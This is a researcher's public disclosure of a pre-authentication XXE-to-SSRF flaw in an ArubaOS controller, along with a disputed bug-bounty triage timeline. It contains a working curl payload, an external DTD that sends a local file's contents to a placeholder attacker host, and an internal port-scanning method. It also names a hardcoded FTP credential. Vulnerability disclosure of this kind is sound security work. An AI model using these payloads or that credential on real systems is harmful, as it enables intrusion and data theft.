# Pre-Authentication XXE → OOB SSRF in ArubaOS 8.13.2.0 (Port 32000)

**Researcher:** Vesqer / JM00NJ  
**Blog:** [netacoding.com](https://netacoding.com)  
**GitHub:** [github.com/JM00NJ](https://github.com/JM00NJ)  
**Date:** June 2026  
**Submission ID:** 9e946ca3 (HPE Networking Product Public Program, Bugcrowd)  
**Status:** Closed as "Not Applicable" — "theoretical / no valid PoC"  

---

## Background

This is a documentation of a pre-authentication XML External Entity (XXE) injection vulnerability with confirmed Out-of-Band (OOB) Server-Side Request Forgery (SSRF) in ArubaOS 8.13.2.0 LSR. The vulnerability was submitted to the HPE Networking Bug Bounty Program on Bugcrowd on May 6, 2026.

Despite four independent pieces of evidence — including wire-level packet captures and the target system's own daemon logs confirming server-side execution — the submission was closed as "theoretical / no valid PoC." Both Requests for Response went unanswered. This writeup documents the vulnerability, the evidence, and the full timeline so the security community can evaluate independently.

---

## Target

| Field | Value |
|-------|-------|
| Product | HPE Aruba Networking Wireless — AOS-8 Controller |
| Version | ArubaOS 8.13.2.0 LSR (Build 95415, compiled 2026-03-25) |
| Model | ArubaMC-VA-US |
| Endpoint | `http://<device-ip>:32000/` |
| Authentication | None required |
| CVSS v3.1 | 9.3 Critical — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| CWE | CWE-611: Improper Restriction of XML External Entity Reference |

---

## Vulnerability Description

Port 32000/TCP on ArubaOS 8.13.2.0 exposes an XML management interface (`default-xml-api` AAA profile) that is reachable **without any authentication**. The XML parser processes `SYSTEM` external entity declarations, resolving them against attacker-controlled infrastructure.

This enables:
1. **OOB SSRF** — forcing the controller to initiate outbound HTTP connections to arbitrary hosts
2. **Internal network enumeration** — using the controller as an unwilling proxy to probe internal services
3. **External DTD resolution** — fetching and processing attacker-hosted DTD files

The endpoint is not a misconfiguration of the test environment. The AAA profile `default-xml-api` ships with no authentication configured.

---

## Proof of Concept

### Step 1 — Direct OOB SSRF

Start a TCP listener:
```bash
nc -lvp 9999
```

Send crafted XML:
```bash
curl -s -X POST "http://<target>:32000/" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<attacker>:9999/test">]>
<aruba><opcode>&xxe;</opcode></aruba>'
```

**Observed on attacker listener:**
```
Connection received on 192.168.56.50 36048
GET /test HTTP/1.0
Host: <attacker-ip>:9999
```

The controller initiates a TCP connection, completes the 3-way handshake, and sends a valid HTTP GET request to attacker-controlled infrastructure.

### Step 2 — External DTD Resolution

Create `evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://<attacker>:9999/?d=%file;'>">
%eval;
%send;
```

Create `oob.xml`:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://<attacker>:8080/evil.dtd">
<aruba><opcode>test</opcode></aruba>
```

**Observed on attacker HTTP server:**
```
192.168.56.50 - [06/May/2026 02:33:43] "GET /evil.dtd HTTP/1.0" 200 -
192.168.56.50 - [06/May/2026 02:36:10] "GET /evil.dtd HTTP/1.0" 200 -
192.168.56.50 - [06/May/2026 02:38:17] "GET /evil.dtd HTTP/1.0" 200 -
```

The controller fetched the external DTD three independent times.

### Step 3 — Internal Port Scanning via SSRF

The SSRF can be directed to internal services. The controller returned `<dialog>success</dialog>` for probes against `127.0.0.1` on all of the following ports:

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP |
| 443 | HTTPS |
| 4343 | ArubaOS Management API |
| 8080 | HTTP alternate |
| 8443 | HTTPS alternate |
| 3306 | MySQL |
| 5432 | PostgreSQL |
| 9200 | Elasticsearch |

9 internal ports confirmed open via an unauthenticated pre-authentication endpoint in under 30 seconds.

---

## Evidence

### Evidence 1 — Wire-Level Packet Capture

`obb_proof.pcapng` confirms:

- `192.168.56.50:54216 → 192.168.56.102:9999` — Controller-initiated TCP connection
- Full 3-way handshake completed
- HTTP GET request transmitted: `GET /test HTTP/1.0` (49 bytes, t=0.023s)
- 11 separate TCP connections to port 32000 visible, corresponding exactly to 9 SSRF port scan probes + 2 initial steps

A controller that has not been touched by an attacker does not spontaneously send GET requests to external hosts.

### Evidence 2 — Target System's Own Daemon Logs

The ArubaOS controller's SSH daemon recorded the following:

```
May 13 07:31:56 |sshd| Bad protocol version identification 'GET / HTTP/1.0' from 127.0.0.1 port 33144
```

This log entry can only be produced when a server-side process connects to the local sshd and sends an HTTP request. No external actor can produce a `127.0.0.1`-sourced TCP connection to a service listening on localhost. The target system recorded the SSRF execution in its own logs.

**The triage response ("theoretical / no valid PoC") was never reconciled with this log entry. No explanation was provided.**

### Evidence 3 — External DTD Fetch Log

Three independent HTTP server log entries confirming the controller fetched attacker-hosted content:

```
192.168.56.50 - [06/May/2026 02:33:43] "GET /evil.dtd HTTP/1.0" 200 -
192.168.56.50 - [06/May/2026 02:36:10] "GET /evil.dtd HTTP/1.0" 200 -
192.168.56.50 - [06/May/2026 02:38:17] "GET /evil.dtd HTTP/1.0" 200 -
```

### Evidence 4 — Internal Port Scan Screenshot

`proof.png` — Wireshark capture + script output showing 9 internal ports confirmed open via `<dialog>success</dialog>` responses from the controller.

---

## Additional Attack Surface Observations

Noted during investigation (not submitted as separate findings):

- **TCP timestamp exposure** — Response timestamps reveal device uptime (~49 days), enabling patch cycle correlation
- **Legacy UI components** — Response header `X-UA-Compatible: IE=edge;IE=11;IE=10;IE=9` indicates legacy browser targets
- **Weak CSP** — `Content-Security-Policy` limited to `frame-ancestors` only; absence of `script-src` means any XSS on this endpoint would have unrestricted execution impact

---

## Timeline

| Date | Event |
|------|-------|
| 06 May 2026 03:21 UTC | Submission created (9e946ca3) |
| 06 May 2026 04:45 UTC | Payload correction note added |
| 06 May 2026 18:49 UTC | Additional observations (TCP timestamp, CSP) added |
| 10 May 2026 16:20 UTC | Tal_Bugcrowd: **N/A — "theoretical, no valid PoC"** |
| 10 May 2026 16:41 UTC | Researcher dispute: wire-level pcap + OOB callback cited |
| 10 May 2026 17:07 UTC | Full evidence summary added (pcap, logs, port scan) |
| 11 May 2026 12:24 UTC | First RaR submitted: "Issue is reproducible" |
| 13 May 2026 15:23 UTC | **sshd log evidence added** — server-side SSRF confirmed |
| 21 May 2026 20:02 UTC | Formal RaR response citing all 4 evidence items |
| 27 May 2026 00:18 UTC | **First RaR expired — no response from Bugcrowd** |
| 28 May 2026 12:06 UTC | Second and final RaR: direct question about sshd log |
| 31 May 2026 13:04 UTC | Researcher formally concluded disclosure via platform |

**Total time: 25 days. Triage response to all evidence: none.**

---

## Why The "Theoretical" Classification Is Incorrect

The triage response was: *"This is all theoretical with no actual valid proof of concept/impact."*

CWE-611 (XXE) does not require in-band file exfiltration to be valid. OOB callback confirming external entity resolution on a pre-authentication endpoint **is the vulnerability**, consistent with:

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger: Blind XXE vulnerabilities](https://portswigger.net/web-security/xxe/blind)
- [Bugcrowd VRT: Server-Side Injection > XML External Entity Injection (XXE)](https://bugcrowd.com/vulnerability-rating-taxonomy)

The absence of in-band reflection is a parser implementation detail. The controller resolves external entities and initiates outbound connections — both confirmed at the wire level and in its own logs.

---

## Impact

**As an attacker I could:**

1. Force the ArubaOS controller to initiate HTTP connections to any host on the internet or internal network — without any credentials
2. Use the controller as an unwilling SSRF proxy to enumerate internal services not directly reachable from outside
3. Probe all internal management interfaces (SSH, WebUI, REST API, database ports) through the controller
4. Confirm internal service availability as a precondition for further attack chains

The controller sits at the center of enterprise wireless infrastructure. An unauthenticated attacker with network adjacency (or access to port 32000 if exposed) can enumerate the internal network through the controller using nothing but standard HTTP requests.

---

## Disclosure Note

This vulnerability was submitted to the HPE Networking Product Public Program on Bugcrowd on May 6, 2026. The program closed the submission as "Not Applicable" citing "theoretical / no valid PoC." Two Requests for Response were submitted; neither received a substantive technical reply. The first RaR expired without response.

Per the program's own disclosure policy:

> *"Public disclosure of vulnerabilities will generally take place only after permanent fixes are available."*

The program has determined no vulnerability exists, therefore no fix is forthcoming and no advisory will be published. The 60-day post-advisory window does not apply to findings the vendor has declined to acknowledge.

This writeup is published to allow the security community to independently evaluate the findings and the quality of the triage process.

---

## Related Submissions (Same Program)

| ID | Finding | Status |
|----|---------|--------|
| 0c716fec | XXE → FTP SSRF with full RETR session | N/A (RaR pending) |
| d13d0e83 | Hardcoded FTP credential (sap:x, CWE-798) | Active — blocker on researcher |
| 09e49fa1 | ICMP Reflection/Smurf (two-machine pcap) | N/A |
| c5eda0ae | Ghost Leak TTL=0 + IP length over-read | N/A |
| b5727197 | ICMP payload relay (zero DPI) | N/A |

---

*Vesqer / JM00NJ — netacoding.com*
